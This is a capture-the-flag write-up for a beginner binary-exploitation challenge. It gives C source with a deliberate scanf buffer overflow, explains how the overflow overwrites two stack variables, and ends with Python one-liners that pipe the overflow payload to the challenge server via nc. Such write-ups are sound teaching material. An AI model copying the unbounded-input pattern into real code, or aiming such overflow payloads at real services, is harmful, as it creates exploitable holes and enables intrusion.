# Challenge Description
Challenge Name: **Baby Witcher**  
Category: `pwn`
```
Do you want to be a Witcher? Then get the flag.

Author: peace_ranger
nc <ip> <port>
```
# Challenge Source
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int print_flag(int arg1, int arg2)
{
    if (arg1 == 0x1569 && arg2 == 0xcafe69)
    {
        FILE *fp;
        if ((fp = fopen("flag.txt","r")) == NULL)
        {
            printf("Error! opening file");
            exit(1);
        }

        char flag[69];
        fgets(flag, sizeof(flag), fp);
        printf("%s\n", flag);
        return 1;
    }
    return 0;
}

int main()
{
    int arg1 = 0, arg2 = 0;
    char buf[12];
    
    printf("You want to be a Witcher? Then prove your worth.\n");
    printf("Tell me the Witcher Code.\n");
    fflush(stdout);

    scanf("%s", buf);

    int ok = print_flag(arg1, arg2);
    if (ok)
    {
        printf("Good job! See u in Trial of Grass :)\n");
    }
    else
    {
        printf("Sorry! You don't have what we're looking for. Come back again in few days.\n");
    }
    exit(0);
}
```
# Writeup
The challenge source, binary and Dockerfile was given to contestants. The challenge is intended for beginners who are just starting out in binary exploitation. It requires participants to use the buffer overflow vulnerability due to `scanf()` and overwrite the two arguments to `print_flag()` function with some specified value. If `arg1` and `arg2` are overwritten with `0x1569` and `0xcafe69` respectively, then `flag.txt` will be read and shown.  
The challenge binary is 32-bit and hence follows the x86 calling convention. One has to know the x86 calling convention to successfully overwrite the two variables. `arg2` is pushed on the stack first, then `arg1`. So, while sending the payload the value for `arg2` has to be sent first and `arg1` next. Also, as values have to be sent as 4-byte integer, `0x00` should be padded with them and fortunately, `scanf()` accepts byte `0x00` as part of the input.  

If the above explanation seemed out of world for anyone, then please follow this [playlist](https://youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&si=1LCJm5Ftao_j37pm). This is one of the best contents on the internet to learn Binary Exploitation. [Video 0x0c](https://youtu.be/T03idxny9jE?si=EpM0ggIRDe0Ztqly) discusses techniques directly related to this challenge.
## Final payload 
One liners to exploit the challenge.  
**Python 2**
```bash
python -c 'print "A"*16 + "\x69\xfe\xca\x00" + "\x69\x15\x00\x00"' | nc <ip> <port>
```
**Python 3**
```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"\x69\xfe\xca\x00" + b"\x69\x15\x00\x00")' | nc <ip> <port>
```
See why we need these two versions of exploit for different python versions in this [stackoverflow answer](https://stackoverflow.com/a/56162216/7737870).
